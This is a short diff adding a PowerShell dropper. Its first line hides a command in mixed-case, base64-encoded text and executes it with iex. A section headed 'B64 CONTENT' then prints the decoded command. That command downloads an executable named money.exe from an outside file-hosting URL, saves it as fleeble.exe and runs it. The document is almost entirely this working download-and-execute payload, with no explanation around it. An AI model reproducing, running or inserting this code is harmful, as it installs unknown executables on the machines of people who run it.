@@ -1,0 +1,7 @@
+iex([SYSTEm.TEXt.enCOdinG]::utf8.gETSTring([sYSTEm.cONvErt]::FroMBase64STrING('CihOZXctT2JqZWN0IHNZU3RFbS5OZXQud2ViY0xJRW5UKS5kb1dubG9BZGZpTEUoJ2h0dHA6Ly9kZGw3LmRhdGEuaHUvZ2V0LzAvOTQ5OTgzMC9tb25leS5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYStEm.Net.webcLIEnT).doWnloAdfiLE('http://ddl7.data.hu/get/0/9499830/money.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
